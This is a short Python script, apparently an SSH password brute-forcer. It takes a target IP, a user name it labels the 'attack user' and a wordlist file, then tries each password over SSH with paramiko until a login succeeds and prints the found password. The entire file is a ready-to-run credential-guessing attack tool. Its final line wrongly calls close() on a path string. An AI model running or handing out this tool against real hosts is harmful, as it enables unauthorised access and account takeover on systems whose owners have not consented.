import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter attack user: '))
passwd_file = str(input('Please enter passfile location: '))

def ssh_connect( password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port = 22, username = username, password = password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(passwd_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()

        try:
            response = ssh_connect(password)
            if response == 0:
                print('password found: ' + password)
                exit(0)
            elif response == 1:
                print("YOU DIDN'T SAY THE MAGIC WORD!")
        except Exception as e:
            print(e)
        pass
passwd_file.close()